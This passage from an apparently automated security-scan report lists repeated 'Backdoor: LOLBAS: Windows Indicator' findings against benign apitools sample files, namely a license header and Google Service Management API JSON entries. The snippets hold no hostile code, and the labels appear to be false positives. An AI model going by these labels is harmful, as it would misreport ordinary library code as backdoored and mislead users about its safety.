                    "text": "  to produce which generated_metric.\n\n  Fields:\n    changeMetric: Change of resource usage at a particular timestamp. This\n      should a DELTA metric.\n    generatedMetric: Metric generated from snapshot_metric and change_metric.\n      This is also a DELTA metric.\n",
                    "rendered": {
                      "text": "  to produce which generated_metric.\n\n  Fields:\n    changeMetric: Change of resource usage at a particular timestamp. This\n      should a DELTA metric.\n    generatedMetric: Metric generated from snapshot_metric and change_metric.\n      This is also a DELTA metric.\n",
                      "markdown": "`  to produce which generated_metric.\n\n  Fields:\n    changeMetric: Change of resource usage at a particular timestamp. This\n      should a DELTA metric.\n    generatedMetric: Metric generated from snapshot_metric and change_metric.\n      This is also a DELTA metric.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/messages_test.py"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 38,
                  "endLine": 7,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 3358,
                  "startColumn": 135,
                  "endLine": 3358,
                  "endColumn": 139,
                  "snippet": {
                    "text": "          \"path\": \"v1/operations/{operationsId}\",\n          \"flatPath\": \"v1/operations/{operationsId}\",\n          \"httpMethod\": \"GET\",\n          \"description\": \"Gets the latest state of a long-running operation.  Clients can use this\\nmethod to poll the operation result at intervals as recommended by the API\\nservice.\",\n          \"parameters\": {\n            \"operationsId\": {\n              \"description\": \"Part of `name`. The name of the operation resource.\",\n",
                    "rendered": {
                      "text": "          \"path\": \"v1/operations/{operationsId}\",\n          \"flatPath\": \"v1/operations/{operationsId}\",\n          \"httpMethod\": \"GET\",\n          \"description\": \"Gets the latest state of a long-running operation.  Clients can use this\\nmethod to poll the operation result at intervals as recommended by the API\\nservice.\",\n          \"parameters\": {\n            \"operationsId\": {\n              \"description\": \"Part of `name`. The name of the operation resource.\",\n",
                      "markdown": "`          \"path\": \"v1/operations/{operationsId}\",\n          \"flatPath\": \"v1/operations/{operationsId}\",\n          \"httpMethod\": \"GET\",\n          \"description\": \"Gets the latest state of a long-running operation.  Clients can use this\\nmethod to poll the operation result at intervals as recommended by the API\\nservice.\",\n          \"parameters\": {\n            \"operationsId\": {\n              \"description\": \"Part of `name`. The name of the operation resource.\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 3286,
                  "startColumn": 152,
                  "endLine": 3286,
                  "endColumn": 160,
                  "snippet": {
                    "text": "onsumerProjectId}\",\n              \"flatPath\": \"v1/services/{serviceName}/projectSettings/{consumerProjectId}\",\n              \"httpMethod\": \"PATCH\",\n              \"description\": \"Updates specified subset of the settings that control the specified\\nconsumer project's usage of the service.  Attempts to update a field not\\ncontrolled by the caller will result in an access denied error.\\n\\nOperation<response: ProjectSettings>\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements",
                    "rendered": {
                      "text": "onsumerProjectId}\",\n              \"flatPath\": \"v1/services/{serviceName}/projectSettings/{consumerProjectId}\",\n              \"httpMethod\": \"PATCH\",\n              \"description\": \"Updates specified subset of the settings that control the specified\\nconsumer project's usage of the service.  Attempts to update a field not\\ncontrolled by the caller will result in an access denied error.\\n\\nOperation<response: ProjectSettings>\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements",
                      "markdown": "`onsumerProjectId}\",\n              \"flatPath\": \"v1/services/{serviceName}/projectSettings/{consumerProjectId}\",\n              \"httpMethod\": \"PATCH\",\n              \"description\": \"Updates specified subset of the settings that control the specified\\nconsumer project's usage of the service.  Attempts to update a field not\\ncontrolled by the caller will result in an access denied error.\\n\\nOperation<response: ProjectSettings>\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 3286,
                  "startColumn": 75,
                  "endLine": 3286,
                  "endColumn": 84,
                  "snippet": {
                    "text": "s.patch\",\n              \"path\": \"v1/services/{serviceName}/projectSettings/{consumerProjectId}\",\n              \"flatPath\": \"v1/services/{serviceName}/projectSettings/{consumerProjectId}\",\n              \"httpMethod\": \"PATCH\",\n              \"description\": \"Updates specified subset of the settings that control the specified\\nconsumer project's usage of the service.  Attempts to update a field not\\ncontrolled by the caller will result in an access denied error.\\n\\nOperation<response: ProjectSettings>\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name",
                    "rendered": {
                      "text": "s.patch\",\n              \"path\": \"v1/services/{serviceName}/projectSettings/{consumerProjectId}\",\n              \"flatPath\": \"v1/services/{serviceName}/projectSettings/{consumerProjectId}\",\n              \"httpMethod\": \"PATCH\",\n              \"description\": \"Updates specified subset of the settings that control the specified\\nconsumer project's usage of the service.  Attempts to update a field not\\ncontrolled by the caller will result in an access denied error.\\n\\nOperation<response: ProjectSettings>\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name",
                      "markdown": "`s.patch\",\n              \"path\": \"v1/services/{serviceName}/projectSettings/{consumerProjectId}\",\n              \"flatPath\": \"v1/services/{serviceName}/projectSettings/{consumerProjectId}\",\n              \"httpMethod\": \"PATCH\",\n              \"description\": \"Updates specified subset of the settings that control the specified\\nconsumer project's usage of the service.  Attempts to update a field not\\ncontrolled by the caller will result in an access denied error.\\n\\nOperation<response: ProjectSettings>\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 3251,
                  "startColumn": 199,
                  "endLine": 3251,
                  "endColumn": 207,
                  "snippet": {
                    "text": " \"v1/services/{serviceName}/projectSettings/{consumerProjectId}\",\n              \"httpMethod\": \"PUT\",\n              \"description\": \"NOTE: Currently unsupported.  Use PatchProjectSettings instead.\\n\\nUpdates the settings that control the specified consumer project's usage\\nof the service.  Attempts to update a field not controlled by the caller\\nwill result in an access denied error.\\n\\nOperation<response: ProjectSettings>\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements",
                    "rendered": {
                      "text": " \"v1/services/{serviceName}/projectSettings/{consumerProjectId}\",\n              \"httpMethod\": \"PUT\",\n              \"description\": \"NOTE: Currently unsupported.  Use PatchProjectSettings instead.\\n\\nUpdates the settings that control the specified consumer project's usage\\nof the service.  Attempts to update a field not controlled by the caller\\nwill result in an access denied error.\\n\\nOperation<response: ProjectSettings>\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements",
                      "markdown": "` \"v1/services/{serviceName}/projectSettings/{consumerProjectId}\",\n              \"httpMethod\": \"PUT\",\n              \"description\": \"NOTE: Currently unsupported.  Use PatchProjectSettings instead.\\n\\nUpdates the settings that control the specified consumer project's usage\\nof the service.  Attempts to update a field not controlled by the caller\\nwill result in an access denied error.\\n\\nOperation<response: ProjectSettings>\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 3251,
                  "startColumn": 122,
                  "endLine": 3251,
                  "endColumn": 131,
                  "snippet": {
                    "text": "{serviceName}/projectSettings/{consumerProjectId}\",\n              \"flatPath\": \"v1/services/{serviceName}/projectSettings/{consumerProjectId}\",\n              \"httpMethod\": \"PUT\",\n              \"description\": \"NOTE: Currently unsupported.  Use PatchProjectSettings instead.\\n\\nUpdates the settings that control the specified consumer project's usage\\nof the service.  Attempts to update a field not controlled by the caller\\nwill result in an access denied error.\\n\\nOperation<response: ProjectSettings>\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name",
                    "rendered": {
                      "text": "{serviceName}/projectSettings/{consumerProjectId}\",\n              \"flatPath\": \"v1/services/{serviceName}/projectSettings/{consumerProjectId}\",\n              \"httpMethod\": \"PUT\",\n              \"description\": \"NOTE: Currently unsupported.  Use PatchProjectSettings instead.\\n\\nUpdates the settings that control the specified consumer project's usage\\nof the service.  Attempts to update a field not controlled by the caller\\nwill result in an access denied error.\\n\\nOperation<response: ProjectSettings>\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name",
                      "markdown": "`{serviceName}/projectSettings/{consumerProjectId}\",\n              \"flatPath\": \"v1/services/{serviceName}/projectSettings/{consumerProjectId}\",\n              \"httpMethod\": \"PUT\",\n              \"description\": \"NOTE: Currently unsupported.  Use PatchProjectSettings instead.\\n\\nUpdates the settings that control the specified consumer project's usage\\nof the service.  Attempts to update a field not controlled by the caller\\nwill result in an access denied error.\\n\\nOperation<response: ProjectSettings>\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 3217,
                  "startColumn": 43,
                  "endLine": 3217,
                  "endColumn": 51,
                  "snippet": {
                    "text": "                  \"type\": \"string\"\n                },\n                \"expand\": {\n                  \"description\": \"Fields to expand in any results.  By default, the following fields\\nare not present in the result:\\n- `operations`\\n- `quota_usage`\",\n                  \"location\": \"query\",\n                  \"type\": \"string\",\n                  \"format\": \"google-fieldmask\"\n",
                    "rendered": {
                      "text": "                  \"type\": \"string\"\n                },\n                \"expand\": {\n                  \"description\": \"Fields to expand in any results.  By default, the following fields\\nare not present in the result:\\n- `operations`\\n- `quota_usage`\",\n                  \"location\": \"query\",\n                  \"type\": \"string\",\n                  \"format\": \"google-fieldmask\"\n",
                      "markdown": "`                  \"type\": \"string\"\n                },\n                \"expand\": {\n                  \"description\": \"Fields to expand in any results.  By default, the following fields\\nare not present in the result:\\n- `operations`\\n- `quota_usage`\",\n                  \"location\": \"query\",\n                  \"type\": \"string\",\n                  \"format\": \"google-fieldmask\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 3202,
                  "startColumn": 57,
                  "endLine": 3202,
                  "endColumn": 66,
                  "snippet": {
                    "text": "              \"path\": \"v1/services/{serviceName}/projectSettings/{consumerProjectId}\",\n              \"flatPath\": \"v1/services/{serviceName}/projectSettings/{consumerProjectId}\",\n              \"httpMethod\": \"GET\",\n              \"description\": \"Retrieves the settings that control the specified consumer project's usage\\nof the service.\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n",
                    "rendered": {
                      "text": "              \"path\": \"v1/services/{serviceName}/projectSettings/{consumerProjectId}\",\n              \"flatPath\": \"v1/services/{serviceName}/projectSettings/{consumerProjectId}\",\n              \"httpMethod\": \"GET\",\n              \"description\": \"Retrieves the settings that control the specified consumer project's usage\\nof the service.\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n",
                      "markdown": "`              \"path\": \"v1/services/{serviceName}/projectSettings/{consumerProjectId}\",\n              \"flatPath\": \"v1/services/{serviceName}/projectSettings/{consumerProjectId}\",\n              \"httpMethod\": \"GET\",\n              \"description\": \"Retrieves the settings that control the specified consumer project's usage\\nof the service.\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 3157,
                  "startColumn": 144,
                  "endLine": 3157,
                  "endColumn": 152,
                  "snippet": {
                    "text": "}/customerSettings/{customerId}\",\n              \"flatPath\": \"v1/services/{serviceName}/customerSettings/{customerId}\",\n              \"httpMethod\": \"PATCH\",\n              \"description\": \"Updates specified subset of the settings that control the specified\\ncustomer's usage of the service.  Attempts to update a field not\\ncontrolled by the caller will result in an access denied error.\\n\\nOperation<response: CustomerSettings>\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirement",
                    "rendered": {
                      "text": "}/customerSettings/{customerId}\",\n              \"flatPath\": \"v1/services/{serviceName}/customerSettings/{customerId}\",\n              \"httpMethod\": \"PATCH\",\n              \"description\": \"Updates specified subset of the settings that control the specified\\ncustomer's usage of the service.  Attempts to update a field not\\ncontrolled by the caller will result in an access denied error.\\n\\nOperation<response: CustomerSettings>\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirement",
                      "markdown": "`}/customerSettings/{customerId}\",\n              \"flatPath\": \"v1/services/{serviceName}/customerSettings/{customerId}\",\n              \"httpMethod\": \"PATCH\",\n              \"description\": \"Updates specified subset of the settings that control the specified\\ncustomer's usage of the service.  Attempts to update a field not\\ncontrolled by the caller will result in an access denied error.\\n\\nOperation<response: CustomerSettings>\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirement`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 3157,
                  "startColumn": 75,
                  "endLine": 3157,
                  "endColumn": 84,
                  "snippet": {
                    "text": "tomerSettings.patch\",\n              \"path\": \"v1/services/{serviceName}/customerSettings/{customerId}\",\n              \"flatPath\": \"v1/services/{serviceName}/customerSettings/{customerId}\",\n              \"httpMethod\": \"PATCH\",\n              \"description\": \"Updates specified subset of the settings that control the specified\\ncustomer's usage of the service.  Attempts to update a field not\\ncontrolled by the caller will result in an access denied error.\\n\\nOperation<response: CustomerSettings>\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the",
                    "rendered": {
                      "text": "tomerSettings.patch\",\n              \"path\": \"v1/services/{serviceName}/customerSettings/{customerId}\",\n              \"flatPath\": \"v1/services/{serviceName}/customerSettings/{customerId}\",\n              \"httpMethod\": \"PATCH\",\n              \"description\": \"Updates specified subset of the settings that control the specified\\ncustomer's usage of the service.  Attempts to update a field not\\ncontrolled by the caller will result in an access denied error.\\n\\nOperation<response: CustomerSettings>\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the",
                      "markdown": "`tomerSettings.patch\",\n              \"path\": \"v1/services/{serviceName}/customerSettings/{customerId}\",\n              \"flatPath\": \"v1/services/{serviceName}/customerSettings/{customerId}\",\n              \"httpMethod\": \"PATCH\",\n              \"description\": \"Updates specified subset of the settings that control the specified\\ncustomer's usage of the service.  Attempts to update a field not\\ncontrolled by the caller will result in an access denied error.\\n\\nOperation<response: CustomerSettings>\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 3123,
                  "startColumn": 43,
                  "endLine": 3123,
                  "endColumn": 51,
                  "snippet": {
                    "text": "                  \"type\": \"string\"\n                },\n                \"expand\": {\n                  \"description\": \"Fields to expand in any results.\",\n                  \"location\": \"query\",\n                  \"type\": \"string\",\n                  \"format\": \"google-fieldmask\"\n",
                    "rendered": {
                      "text": "                  \"type\": \"string\"\n                },\n                \"expand\": {\n                  \"description\": \"Fields to expand in any results.\",\n                  \"location\": \"query\",\n                  \"type\": \"string\",\n                  \"format\": \"google-fieldmask\"\n",
                      "markdown": "`                  \"type\": \"string\"\n                },\n                \"expand\": {\n                  \"description\": \"Fields to expand in any results.\",\n                  \"location\": \"query\",\n                  \"type\": \"string\",\n                  \"format\": \"google-fieldmask\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 3108,
                  "startColumn": 57,
                  "endLine": 3108,
                  "endColumn": 66,
                  "snippet": {
                    "text": "              \"path\": \"v1/services/{serviceName}/customerSettings/{customerId}\",\n              \"flatPath\": \"v1/services/{serviceName}/customerSettings/{customerId}\",\n              \"httpMethod\": \"GET\",\n              \"description\": \"Retrieves the settings that control the specified customer's usage of the\\nservice.\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`. This field is\\nrequired.\",\n",
                    "rendered": {
                      "text": "              \"path\": \"v1/services/{serviceName}/customerSettings/{customerId}\",\n              \"flatPath\": \"v1/services/{serviceName}/customerSettings/{customerId}\",\n              \"httpMethod\": \"GET\",\n              \"description\": \"Retrieves the settings that control the specified customer's usage of the\\nservice.\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`. This field is\\nrequired.\",\n",
                      "markdown": "`              \"path\": \"v1/services/{serviceName}/customerSettings/{customerId}\",\n              \"flatPath\": \"v1/services/{serviceName}/customerSettings/{customerId}\",\n              \"httpMethod\": \"GET\",\n              \"description\": \"Retrieves the settings that control the specified customer's usage of the\\nservice.\",\n              \"parameters\": {\n                \"serviceName\": {\n                  \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`. This field is\\nrequired.\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2913,
                  "startColumn": 44,
                  "endLine": 2913,
                  "endColumn": 52,
                  "snippet": {
                    "text": "          \"path\": \"v1/services/{serviceName}/accessPolicy\",\n          \"flatPath\": \"v1/services/{serviceName}/accessPolicy\",\n          \"httpMethod\": \"PUT\",\n          \"description\": \"Producer method to update the current policy.  This method will return an\\nerror if the policy is too large (more than 50 entries across all lists).\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"The name of the service.  For example: `example.googleapis.com`.\\nIf set, policy's service_name should be same as this one.\",\n",
                    "rendered": {
                      "text": "          \"path\": \"v1/services/{serviceName}/accessPolicy\",\n          \"flatPath\": \"v1/services/{serviceName}/accessPolicy\",\n          \"httpMethod\": \"PUT\",\n          \"description\": \"Producer method to update the current policy.  This method will return an\\nerror if the policy is too large (more than 50 entries across all lists).\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"The name of the service.  For example: `example.googleapis.com`.\\nIf set, policy's service_name should be same as this one.\",\n",
                      "markdown": "`          \"path\": \"v1/services/{serviceName}/accessPolicy\",\n          \"flatPath\": \"v1/services/{serviceName}/accessPolicy\",\n          \"httpMethod\": \"PUT\",\n          \"description\": \"Producer method to update the current policy.  This method will return an\\nerror if the policy is too large (more than 50 entries across all lists).\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"The name of the service.  For example: `example.googleapis.com`.\\nIf set, policy's service_name should be same as this one.\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2561,
                  "startColumn": 39,
                  "endLine": 2561,
                  "endColumn": 47,
                  "snippet": {
                    "text": "              \"type\": \"string\"\n            },\n            \"expand\": {\n              \"description\": \"Fields to expand in any results.  By default, the following fields\\nare not present in the result:\\n- `operations`\\n- `project_settings`\\n- `project_settings.operations`\\n- `quota_usage` (It requires `project_settings`)\\n- `historical_quota_usage` (It requires `project_settings`)\",\n              \"location\": \"query\",\n              \"type\": \"string\",\n              \"format\": \"google-fieldmask\"\n",
                    "rendered": {
                      "text": "              \"type\": \"string\"\n            },\n            \"expand\": {\n              \"description\": \"Fields to expand in any results.  By default, the following fields\\nare not present in the result:\\n- `operations`\\n- `project_settings`\\n- `project_settings.operations`\\n- `quota_usage` (It requires `project_settings`)\\n- `historical_quota_usage` (It requires `project_settings`)\",\n              \"location\": \"query\",\n              \"type\": \"string\",\n              \"format\": \"google-fieldmask\"\n",
                      "markdown": "`              \"type\": \"string\"\n            },\n            \"expand\": {\n              \"description\": \"Fields to expand in any results.  By default, the following fields\\nare not present in the result:\\n- `operations`\\n- `project_settings`\\n- `project_settings.operations`\\n- `quota_usage` (It requires `project_settings`)\\n- `historical_quota_usage` (It requires `project_settings`)\",\n              \"location\": \"query\",\n              \"type\": \"string\",\n              \"format\": \"google-fieldmask\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2520,
                  "startColumn": 39,
                  "endLine": 2520,
                  "endColumn": 47,
                  "snippet": {
                    "text": "              \"type\": \"string\"\n            },\n            \"expand\": {\n              \"description\": \"Fields to expand in any results.  By default, the following fields\\nare not fully included in list results:\\n- `operations`\\n- `project_settings`\\n- `project_settings.operations`\\n- `quota_usage` (It requires `project_settings`)\",\n              \"location\": \"query\",\n              \"type\": \"string\",\n              \"format\": \"google-fieldmask\"\n",
                    "rendered": {
                      "text": "              \"type\": \"string\"\n            },\n            \"expand\": {\n              \"description\": \"Fields to expand in any results.  By default, the following fields\\nare not fully included in list results:\\n- `operations`\\n- `project_settings`\\n- `project_settings.operations`\\n- `quota_usage` (It requires `project_settings`)\",\n              \"location\": \"query\",\n              \"type\": \"string\",\n              \"format\": \"google-fieldmask\"\n",
                      "markdown": "`              \"type\": \"string\"\n            },\n            \"expand\": {\n              \"description\": \"Fields to expand in any results.  By default, the following fields\\nare not fully included in list results:\\n- `operations`\\n- `project_settings`\\n- `project_settings.operations`\\n- `quota_usage` (It requires `project_settings`)\",\n              \"location\": \"query\",\n              \"type\": \"string\",\n              \"format\": \"google-fieldmask\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2394,
                  "startColumn": 39,
                  "endLine": 2394,
                  "endColumn": 48,
                  "snippet": {
                    "text": "          \"type\": \"string\"\n        },\n        \"quotaSettings\": {\n          \"description\": \"Settings that control how much or how fast the service can be used by the\\nconsumer projects owned by the customer collectively.\",\n          \"$ref\": \"QuotaSettings\"\n        }\n      }\n",
                    "rendered": {
                      "text": "          \"type\": \"string\"\n        },\n        \"quotaSettings\": {\n          \"description\": \"Settings that control how much or how fast the service can be used by the\\nconsumer projects owned by the customer collectively.\",\n          \"$ref\": \"QuotaSettings\"\n        }\n      }\n",
